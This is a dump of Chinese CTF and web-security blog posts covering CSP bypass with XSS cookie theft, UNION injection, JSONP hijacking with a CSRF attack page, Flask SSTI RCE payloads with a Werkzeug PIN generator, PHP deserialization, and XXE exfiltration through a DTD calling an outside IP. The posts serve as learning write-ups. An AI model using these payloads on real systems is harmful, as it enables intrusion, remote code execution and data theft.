设置unsafe-eval 允许通过字符串动态创建的脚本执行，比如 eval，setTimeout 等。不写这个默认不允许。script-src ‘nonce-EDNnf03nceIOfn39fn3e9h3sdfa’ 这句话的意思是说只允许nonce值为EDNnf03nceIOfn39fn3e9h3sdfa的脚本执行。(xxx) 同理也可以设置hash值。 CSP绕过CSP绕过我只使用过一种方法，就是Location.href，其他的方法暂时没有尝试过，在 https://xz.aliyun.com/t/5084#toc-2 这篇文章里面写的挺多的，可以仔细阅读。另外一种我感觉有意思的绕过就是CRLF注入绕过，在CSP之前找到CRLF注入点来两个CRLF把CSP挤到body里面。。高，实在是高 CSP BYPASS实例这道题是CSICN_华东北赛区_WEB2 在buuoj有复现。其他的点我看网上都说的差不多了 唯独CSP Bypass说的不详细，这里我详细说一下CSP绕过，其他的不仔细说，就简要说一下如何成功拿到flag。有个投稿和反馈，说了管理员会查看，猜测XSS拿cookie。提交申请时需要爆破md5，好说，写脚本即可。先尝试随便投稿投稿后查看页面，发现存在CSP，所以需要绕过csp。接下来进行XSS，由于过滤了很多关键字，所以考虑HTML实体编码—把字母转ascii并在前面加上&amp;#后面加上;标签可以嵌入JS代码。直接用XSS平台的payload的话会这样： 接下来使用location.href绕过。爆破完md5后管理员点击完在XSS平台就收到cookie啦。接下来是联合注入，最后一句话是-1 union select 1,2,flagg from ciscn.flag，得到flag 总结这道题时隔一年才弄明白CSP是怎么回事，属实我的问题，继续学习，继续努力。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"frp内网穿透","slug":"frp内网穿透","date":"2020-06-01T00:28:46.000Z","updated":"2020-06-01T00:58:45.000Z","comments":true,"path":"2020/06/01/frp内网穿透/","link":"","permalink":"https://polosec.github.io/2020/06/01/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/","excerpt":"","text":"参考链接https://blog.csdn.net/fjh1997/article/details/100850756https://zhuanlan.zhihu.com/p/45445979最近在搭建学校的网络安全训练平台，使用的是CTFD+CTF-Whale组件生成动态独立靶机，由此引发了对内网穿透的思考。首先理解什么是内网穿透 内网穿透的概念了解内网穿透前，需要了解内网穿透这个需求出现的原因。ipv4地址稀缺，于是出现了NAT,NAPT技术实现IP”复用”。NAT：将私网地址通过NAT网关转换成公网地址，同时通信的数量受NAT网关公网地址数限制。NAPT:将私网地址和端口号通过NAPT网关转换成公网地址：端口号，NAPT网关维护一张映射表，记录公网ip:port和私网ip:port的对应关系。这样可以大幅度降低对公网IP的需求量。为什么需要内网穿透？我家电脑是移动的，没有给分配独立的公网IP，我在本机搭建的http服务无法被公网看到。为了解决这类问题，内网穿透技术应需求而生。比如访问我家电脑8888端口的web服务，直接访问我ipip.net看到的ip地址:8888是无法访问的，因为NAT网关没有8888出站记录 的映射关系。内网穿透概念（复制）：内网穿透是我们在进行网络连接时的一种术语，也叫做NAT穿透，即在计算机是局域网内的时候，外网与内网的计算机的节点进行连接时所需要的连接通信，有时候就会出现内网穿透不支的情况。内网穿透的功能就是，当我们在端口映射时设置时，内网穿透起到了地址转换的功能，也就是把公网的地址进行翻译，转成为一种私有的地址，然后再采用路由的方式ADSL的宽带路由器，具有一个动态或者是固定的公网IP，最后ADSL直接在交换机上，这样所有的电脑都可以共享上网。内网穿透除了可以实现内网之间机器的网络通信功通之外，还可以解决UDP中出现的数据传输不稳定问题。看了两张图感觉写的比较好 内网穿透的思路内网电脑主动发消息给公网服务器，相当于公网服务器在转发内网服务器的数据，使用第三台机器访问公网服务器的时候即可访问内网服务器提供的服务。这受公网服务器带宽限制。 内网穿透实现（frp）网络结构： 服务器为Windows10，移动大内网xD,服务器是我科学上网用的vps，有独立的公网IP。软件安装：首先在github上下载对应系统架构的frp，Windows比较好选，我出问题的是vps的版本选择，一开始选的是amd64版本，但是无法执行bin file,使用arch命令查看架构后才发现架构为i686，是32位系统。。。哎。软件配置： 软件配置参考https://zhuanlan.zhihu.com/p/45445979 这里不想在详细展开说，注意几点，就是不能人家写什么你就写什么，需要明白各个配置的意义，否则你搁这穿什么呢？vhost_http_port 参数配置的是web服务的端口，需要在frpc客户端定义domain（没有的话就写服务器ip），指明本地web服务端口。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"Docker技术原理浅析","slug":"Docker技术原理浅析","date":"2020-05-29T14:41:05.000Z","updated":"2020-05-29T15:25:06.000Z","comments":true,"path":"2020/05/29/Docker技术原理浅析/","link":"","permalink":"https://polosec.github.io/2020/05/29/Docker%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/","excerpt":"","text":"参考链接：https://www.zhihu.com/question/331023021https://www.zhihu.com/question/48174633/answer/616413576别人说的话我就不复制粘贴了，挑一些我个人认为比较有意思的点和比较基础的点说一下。 docker的一些概念image image是一堆只读层的统一视角，UFS技术可以把这一对只读层整合成一个文件系统 container 容器就是在image上面加了一个可读可写层。container=image+ R&amp;W Layerdocker start=docker create &amp; docker run Repository Repository意思为仓库，类似github上面有很多代码可以clone到本地，在docker中就相当于可以pull镜像到本地。官方的仓库是docker hub Registry Registry是私有仓库，Registry包含了一个或多个Repository，每个Repository可以有多个Tag，每个Tag对应一个image。我理解的docker是”轻量级”虚拟机。这个概念应该不是正确的，因为虚拟机和docker的区别还是挺大的，再多抽象几层我感觉这么理解也可以docker的方便之处在于不需要像虚拟机一样重新虚拟出来硬件和操作系统，docker只需要pull镜像直接用就行。docker可以快速部署的另一个原因除了是分层可复用之外，就是可以”一键”安装所需依赖。我理解的是类似makefile。dockerfile类似makefile，但是一个dockerfile对应一个容器或者说对应着一个服务（如MySQL）然后docker-compose.yml 包含一个个dockerfile文件形成了一个工程。docker 进程会对每个容器的资源进行管理。docker的镜像分层我认为是比较有意思的，有点类似面向对象编程思想的”继承”。docker的基础镜像应该是最大的，但是从基础镜像新建一个镜像的话，并不需要复制所有内容，即不需要占用两倍的存储空间，只需要把不一样的保存下来就好。这得益于Linux的COW策略。即：没写过文件的不用动，写过的文件保存成新的文件。docker会在容器最上层创建一个读写层，用来保存对基础镜像的修改操作操作的文件。 docker与虚拟机的区别首先是虚拟化层次不一样。虚拟机完整地虚拟了内核和用户空间，而docker仅仅是虚拟了用户空间，内核用的是操作系统的内核。每个容器只是说相互之间的应用、依赖不同，但其最底层的镜像应该是相同的。他们用共同一个基础镜像，对基础镜像有修改，这个修改保存到各个容器内部，docker进程对容器之间进行隔离。docker启动速度快，占用资源少；而虚拟机启动速度慢，消耗资源多。这里引用两句话，感觉说的非常好：“其实最大的区别在于应用场景的不同：虚拟机最开始出现是为了模拟不同的硬件平台，但是现在云计算时代是为了提供的计算能力的虚拟化，这样可以快速灵活的划分和分配计算资源。容器则是随着应用程序的架构发展所自然衍生出来的东西。当软件越来越复杂，单体应用没法再发展下去了，每个功能逐渐独立出来，出现面向服务的架构，进而出现所谓微服务的架构。“","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"JSON&JSONP&CSRF","slug":"JSON-JSONP-CSRF","date":"2020-05-22T02:12:47.000Z","updated":"2020-06-01T02:56:38.000Z","comments":true,"path":"2020/05/22/JSON-JSONP-CSRF/","link":"","permalink":"https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/","excerpt":"","text":"参考链接：https://cloud.tencent.com/developer/article/1516219https://blog.csdn.net/u011089760/article/details/93550458https://blog.csdn.net/qq_37133717/article/details/105749589https://blog.csdn.net/tianjindong0804/article/details/84971922https://archive.phocean.net/2013/10/13/csrf-with-jsonp.html JSON谈jsonp之前，首先明白什么是json。json全称JavaScript Object Notation，JS对象标记，是一种轻量级的数据交换方式，JSON最常用的是对象的键值对，有点像python中dict数据结构。例如{“k1”:”v1”,”k2”:”v2”} JSON HijackingJSON劫持通过诱导用户点击恶意文件，重写Array()构造函数的方法，将json数据发送给攻击者。JSON劫持步骤（参考）1）重新定义数组构造函数Array = function() 并将数组赋值给我们定义的全局变量； 2）向目标网站发送一条请求，借用被攻击者的session权限； 3）将获得的数据赋给yourData，从而进行任意处理。 其中第一步的函数覆盖是关键，可以JS中的方法覆盖的特性或者使用JS的特殊方法Object.prototype.__defineSetter__等。（这个函数在新版chrome和firefox已失效。） JSONP什么是JSONP？JSONP是带有填充（Padding）的JSON数据。JSONP为了解决跨域问题，我们知道，JS,XHR(AJAX)可以发起跨域请求，但是拿不到跨域请求的资源（或者说看不到响应、拿不到响应数据） JSONP最大的特征是回传。使用方法为在页面中加入&lt;script&gt;标签,src属性为请求的JS资源的URL，最后加上回调函数的名称，比如请求URL为：www.test.io/1.php?callback=cb然后在当前页面需要写一个JS函数： 1234function cb(data)&#123; alert(data.username)&#125; 举个例子：前端页面： 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt; &lt;title&gt;hack&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; function resolveJson(result) &#123; //浏览器端代码 alert(result.name); &#125; &lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;http://test2.io/jsonp.php?callback=resolveJson&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt; 后端处理： 12345&lt;?php$callback = $_GET[&#x27;callback&#x27;];$arr = array(&quot;name&quot; =&gt; &quot;alsy&quot;, &quot;age&quot; =&gt; &quot;20&quot;);echo $callback.&quot;(&quot;. json_encode($arr) .&quot;);&quot;;?&gt; 效果： JSONP注入由于传的callback内容是自定义的，所以可能会导致XSS（返回包content-type为text/html的话）如传入的?callback=callback=alert(‘xss’) JSONP劫持JSONP劫持的目的是盗取用户敏感数据，或者拿到token进行CSRF利用JSON劫持与JSONP注入的异同：同:都可以劫持用户数据，盗取敏感信息，挂马等操作异：jsonp返回的数据有callback函数名包裹。jsonp注入还可以造成xss。 JSONP劫持流程1.用户登录存在JSONP劫持的网站，通常参数存在callback 或者htmlback2.用户携带身份信息访问攻击者编写的页面。3.攻击者编写的页面自定义了callback函数名，并且通过script标签像用户隐私数据发起请求（这里需要用到用户身份信息）4.用户访问攻击页面后，携带身份信息访问攻击者指定的JSONP数据，并且在当前攻击页面的回调函数中完成操作（该操作可能是发送隐私信息给攻击者，也可能是拿token进行csrf） #JSONP与CSRF思路：通过JSONP得到页面的token，然后生成表单，写上token，发送请求。攻击页面代码： 1234567891011121314151617181920212223242526272829303132&lt;html&gt;&lt;head&gt;&lt;title&gt;test&lt;/title&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;test&quot;&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;function test(obj)&#123; // 获取对象中的属性值 var content = obj[&#x27;html&#x27;] // 正则匹配出参数值 var token=content.match(&#x27;token = &quot;(.*?)&quot;&#x27;)[1]; // 添加表单节点 var parent=document.getElementById(&quot;test&quot;); var child=document.createElement(&quot;form&quot;); child.method=&quot;POST&quot;; child.action=&quot;http://vuln.com/del.html&quot;; child.id=&quot;test1&quot; parent.appendChild(child); var parent_1=document.getElementById(&quot;test1&quot;); var child_1=document.createElement(&quot;input&quot;); child_1.type=&quot;hidden&quot;;child_1.name=&quot;token&quot;;child_1.value=token; var child_2=document.createElement(&quot;input&quot;); child_2.type=&quot;submit&quot;; parent_1.appendChild(child_1); parent_1.appendChild(child_2);&#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://vuln.com/caozuo.html?htmlcallback=test&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 实现JSONP+CSRF有些难度，首先需要存在jsonp劫持，其次能在源码里找到token，最后需要绕过referer限制。 referer绕过策略：1.空referrer:在很多情况下，开发者在部署过滤 Referer 来源时，忽视了一个空 Referer 的过滤。一般情况下浏览器直接访问某 URL 是不带 Referer 的，所以很多防御部署是允许空 Referer 的。恰恰也就是这个忽视，导致了整个防御的奔溃。因为在通过跨协议调用 js 时，发送的 http 请求里 Referer 为空！ 跨协议调用的一个简单例子： 1&lt;iframe src&#x3D;&quot;javascript:&#39;&lt;script&gt;function JSON(o)&#123;alert(o.userinfo.userid);&#125;&lt;&#x2F;script&gt;&lt;script src&#x3D;http:&#x2F;&#x2F;www.qq.com&#x2F;login.php?calback&#x3D;JSON&gt;&lt;&#x2F;script&gt;&#39;&quot;&gt;&lt;&#x2F;iframe&gt; 代码里我们使用 调用 javscript 伪协议来实现空 Referer 调用 JSON 文件。（参考自知道创宇https://blog.knownsec.com/2015/03/jsonp_security_technic/） 2.绕过referrer的正则有些referer的正则写的不太行，可以绕过。。不过估计现代网站应该比较完善了 防护严格定义 Content-Type: application / json这样可以防止XSS 完善referer过滤规则过滤JSON的数据输出","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"再谈flask-ssti","slug":"再谈flask-ssti","date":"2020-05-18T07:04:23.000Z","updated":"2020-05-18T08:30:54.000Z","comments":true,"path":"2020/05/18/再谈flask-ssti/","link":"","permalink":"https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/","excerpt":"","text":"进一步理解flask-sstissti的目的：1.读取文件（LFI,获取secret key 伪造session）2.RCE BUUOJ FLASK-APP 题目分析先看看提示，提示了PIN 第一种做法：参考链接https://xz.aliyun.com/t/2553简单地说就是flask app 在debug模式下通过terminal显示的pin码可以在报错的时候进入python shell。并且运行应用程序时该pin码不会变。接下来需要知道生成PIN码需要什么。1.当前用户名2.app.py的绝对路径3.model name 一般是flask.app4.app名称 一般是Flask5.网卡十进制数（服务器的，读/sys/class/net/eth0/address）6.machine-id（docker的话需要读取/proc/self/cgroup ，正常Linux读取/etc/machine-id）那么接下来就需要获取这些。首先是app.py的绝对路径，通过报错获得： /usr/local/lib/python3.7/site-packages/flask/app.py然后是当前用户名，有两种方法，我用的是第一种，通过ssti 读文件/etc/passwd 发现用户flaskweb，猜测就是这个用户另一种准确的方法是执行系统命令： 1&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125; 这里需要绕过os popen过滤 方法是拼接字符串 用单引号。双引号会失败 不知道为什么看到当前用户是flaskweb。接下来读取网卡十进制与machine-id 由于buuoj是docker环境，所以需要从/proc/self/cgroup读。网卡： 1&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;op&#39;+&#39;en&#39;](&quot;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&quot;).read()&#125;&#125; 02:42:ae:01:5e:21 转十进制不用说了。2485410422305machine-id： 123&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;op&#39;+&#39;en&#39;](&quot;&#x2F;proc&#x2F;self&#x2F;cgroup&quot;).read()&#125;&#125;08220fc28119ede2eeaafa166f633321a5fe013f1a5bd26335d47e595376ccaf 生成PIN码的脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ &#x27;flaskweb&#x27;,# username &#x27;flask.app&#x27;,# modname &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)) &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),]private_bits = [ &#x27;2485410422305&#x27;,# str(uuid.getnode()), /sys/class/net/ens33/address &#x27;08220fc28119ede2eeaafa166f633321a5fe013f1a5bd26335d47e595376ccaf&#x27;# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 生成出来的PIN 在报错页面点击右面的terminal图标输入进去就好啦，接下来就是愉快的命令执行了~ finished. 第二种做法既然知道了是SSTI,WHY NOT RCE DIRECTLY!! 12&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&#39;o&#39;+&#39;s&#39;][&#39;pop&#39;+&#39;en&#39;](&quot;ls &#x2F;&quot;).read()&#125;&#125;&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&#39;o&#39;+&#39;s&#39;][&#39;pop&#39;+&#39;en&#39;](&quot;sort &#x2F;this_is_the_fla\\g.txt&quot;).read()&#125;&#125; 这里防止对cat有过滤 直接用的sort。已经知道的过滤是popen，import，flag。os不知道，懒得测试了 直接绕过 思考这里我写了几种自己研究和网上学习到的payload 引用资源：dict 保存类实例或对象实例的属性变量键值对字典class 返回类型所属的对象mro 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。bases 返回该对象所继承的基类// __base__和__mro__都是用来寻找基类的 subclasses 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表init 类的初始化方法globals 对包含函数全局变量的字典的引用我思考的：__builtins__里面包括了一些直接拿来用的方法 比如说hex open等。 123456789101112131415python3:&#123;&#123;().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/flag&#x27;).read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;#命令执行：&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;#文件操作&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 这种不用找类当然了 万能的实际用起来可能并不能。。因为一般会过滤 比如这道题的import 和 popen都过滤了，RCE的时候万金油不太行了！python2:&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125; &#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)&#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465SSTI关键词（防护用）[](\\)&#123;&#125;___.g&#39;&#39;&quot;&quot;requestgnamespace__dict____class____mro____bases____subclasses____init____globals__selfconfigurl_forget_flashed_messageslipsumcurrent_apprangesessiondictget_flashed_messagescyclerjoiner__builtins____import__evalkeysindexvaluespopenread_TemplateReference__contextenvironapplication_get_data_for_jsonJSONEncoderdefaultsystemflag*?import_IterationGuardcatch_warnings_ModuleLockflagchrsubprocesscommandssockethexbase64 找模块脚本： 123456789101112131415161718192021222324252627282930num=0import numpychoice=int(input(&quot;找os1 其他0&quot;))if choice==1: for item in [].__class__.__mro__[1].__subclasses__(): try: if &#x27;os&#x27; in item.__init__.__globals__: print(num) print(item) num+=1 except: print(&#x27;-&#x27;) num+=1else: searchList = [&#x27;__init__&#x27;, &quot;__new__&quot;, &#x27;__del__&#x27;, &#x27;__repr__&#x27;, &#x27;__str__&#x27;, &#x27;__bytes__&#x27;, &#x27;__format__&#x27;, &#x27;__lt__&#x27;, &#x27;__le__&#x27;, &#x27;__eq__&#x27;, &#x27;__ne__&#x27;, &#x27;__gt__&#x27;, &#x27;__ge__&#x27;, &#x27;__hash__&#x27;, &#x27;__bool__&#x27;, &#x27;__getattr__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__setattr__&#x27;, &#x27;__dir__&#x27;, &#x27;__delattr__&#x27;, &#x27;__get__&#x27;, &#x27;__set__&#x27;, &#x27;__delete__&#x27;, &#x27;__call__&#x27;, &quot;__instancecheck__&quot;, &#x27;__subclasscheck__&#x27;, &#x27;__len__&#x27;, &#x27;__length_hint__&#x27;, &#x27;__missing__&#x27;,&#x27;__getitem__&#x27;, &#x27;__setitem__&#x27;, &#x27;__iter__&#x27;,&#x27;__delitem__&#x27;, &#x27;__reversed__&#x27;, &#x27;__contains__&#x27;, &#x27;__add__&#x27;, &#x27;__sub__&#x27;,&#x27;__mul__&#x27;] neededFunction = [&#x27;open&#x27;] pay = int(input(&quot;Payload?[1|0]&quot;)) for index, i in enumerate(&#123;&#125;.__class__.__base__.__subclasses__()): for attr in searchList: if hasattr(i, attr): if eval(&#x27;str(i.&#x27;+attr+&#x27;)[1:9]&#x27;) == &#x27;function&#x27;: for goal in neededFunction: if (eval(&#x27;&quot;&#x27;+goal+&#x27;&quot; in i.&#x27;+attr+&#x27;.__globals__[&quot;__builtins__&quot;].keys()&#x27;)): if pay != 1: print(index,i.__name__,&quot;:&quot;, attr, goal) else: print(&quot;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;&quot; + i.__name__ + &quot;&#x27; %&#125;&#123;&#123; c.&quot; + attr + &quot;.__globals__[&#x27;__builtins__&#x27;].&quot; + goal + &quot;(\\&quot;[evil]\\&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&quot;)","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"buuoj","slug":"buuoj","permalink":"https://polosec.github.io/tags/buuoj/"}]},{"title":"网鼎杯web-反序列化,java","slug":"网鼎杯web-反序列化","date":"2020-05-15T15:08:19.000Z","updated":"2020-05-16T11:31:14.000Z","comments":true,"path":"2020/05/15/网鼎杯web-反序列化/","link":"","permalink":"https://polosec.github.io/2020/05/15/%E7%BD%91%E9%BC%8E%E6%9D%AFweb-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"反序列化题目源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; 阅读源码后可以发现，这道题过滤的内容比较少，相对简单，但是我一开始还是没做出来，菜。方法一：利用php7.1+特性，对属性类型不敏感，本地构造的时候把protected换成public构造即可。O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;s:7:”content”;s:1:”t”;}右键查看源码即可。方法二：在利用php7.1+特性的基础上，利用php伪协议，php://filter/convert.base64-encode/resource=flag.php获取flag.php文件内容。得到内容为PD9waHAgJGZsYWc9J2ZsYWd7YzI0NmJmMzEtOGM3Zi00M2FhLTliY2QtMGY2NDVlNTk2NWQxfSc7Cg==然后base64解码即可。&lt;?php $flag=’flag{c246bf31-8c7f-43aa-9bcd-0f645e5965d1}’; java file这道题拿到手没什么思路，看了师傅们的wp继续做，知道了是目录穿越。首先明白tomcat部署项目的文件结构：部署在webapps文件夹下，其下每个文件夹代表一个项目。 classes文件夹下存放基本类，servlet等文件。首先随便传个文件，发现了servlet的名字。首先要获取web.xml文件，看看文件结构是怎样的，然后再把对应的东西下载下来使用../不断返回上级目录，最后是/web.xmlpayload:DownloadServlet?filename=../../../web.xml下载下来之后发现了几个servlet文件，对应应该是classes/xxxx.servlet.class（注意前面还有包名）下载servlet.class文件：payload:?filename=../../../classes/cn/abc/servlet/UploadServlet.class这样子把四个servlet下载下来，然后反编译阅读源码 这是下载的servlet，注意看过滤了flag，不能通过目录穿越直接穿越到根目录下载flag文件。继续看上传servlet，关键代码： 12345678910if (filename.startsWith(&quot;excel-&quot;) &amp;&amp; &quot;xlsx&quot;.equals(fileExtName)) &#123; try &#123; Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); &#125; catch (InvalidFormatException var20) &#123; System.err.println(&quot;poi-ooxml-3.10 has something wrong&quot;); var20.printStackTrace(); &#125; &#125; 这里可能存在XXE漏洞，遂测试。excel文件需要以excel-开头。由于是在buuoj复现，所以不可以用外网vps，只能用内网vps，用另外一个号再开一个ssh连着。。。卡了俩小时XXE我也不是很了解，后续会继续学习。这里跟着师傅们先复现：大体思路就是xml文件加载外部实体，加载的外部实体里面会”包含”（我是这么理解的）本地flag文件，然后向vps发送一个请求，参数把flag文件带出去。dtd文件： 123&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;174.1.87.39:8888&#x2F;?%file;&#39;&gt;&quot;&gt;%all; xml中新添加的内容： 12&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;174.1.87.39&#x2F;1.dtd&quot;&gt;&lt;data&gt;&amp;send;&lt;&#x2F;data&gt; 这里有个坑 就是在Windows系统下不要解压，直接修改后缀然后用360压缩在压缩文件内修改，再把扩展名改回去。改好之后服务器监听端口，上传文件。 结束。 总结XXE不太熟，需要再学习，目录穿越想到了，但是没成功利用，再有就是我看的目录结构看的是java web项目的目录结构，而不是tomcat部署的目录结构，所以也没利用成功。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"buuoj","slug":"buuoj","permalink":"https://polosec.github.io/tags/buuoj/"}]},{"title":"DASCTF-misc","slug":"DASCTF-misc","date":"2020-05-14T14:00:32.000Z","updated":"2020-05-14T15:15:30.000Z","comments":true,"path":"2020/05/14/DASCTF-misc/","link":"","permalink":"https://polosec.github.io/2020/05/14/DASCTF-misc/","excerpt":"","text":"DASCTF-MISC-内存取证参考链接http://www.fzwjscj.xyz/index.php/archives/25/首先使用volatility 分析操作系统版本，然后过滤文件，将其dump出来。 这是dump出来的内容通过分析发现在ctf-wiki上是ABC加密，QWE对应着ABC，然后密文是CTKQEKNHZHQLLVGKROLATNWGQKRRKQGWNTA将其解密后结果为veracryptpasswordiskeyboarddraobyek同时提示密码是大写的，所以密码应该是KEYBOARDDRAOBYEK然后使用veracrypt加载secret，输入密码之后有个vhd文件，可以直接右键挂载。但是里面的flag是假的。。用010editor也没看出来什么端倪，参考wp后才知道是NTFS隐写。使用ntfsstreamseditor打开后可以看到隐写的内容flag{4a02f6dc603c377a234df479609d237c} 总结首先是没找到txt文件，其次是不知道加密方式，再到后面是没想到NTFS隐写。。这道题。。自己做是做不出来但是也学习到了NTFS隐写这种操作。参考链接：https://www.cnblogs.com/Chesky/p/ALTERNATE_DATA_STREAMS.html在NTFS文件系统中存在着NTFS交换数据流（Alternate Data Streams，简称ADS），这是NTFS磁盘格式的特性之一。每一个文件，都有着主文件流和非主文件流，主文件流能够直接看到；而非主文件流寄宿于主文件流中，无法直接读取，这个非主文件流就是NTFS交换数据流。简单地说就是可以隐藏文件（图片视频可执行文件）并且正常情况下看不到。可以使用type命令将需要隐藏的文件附加上去。如type “hidden.jpg” &gt; 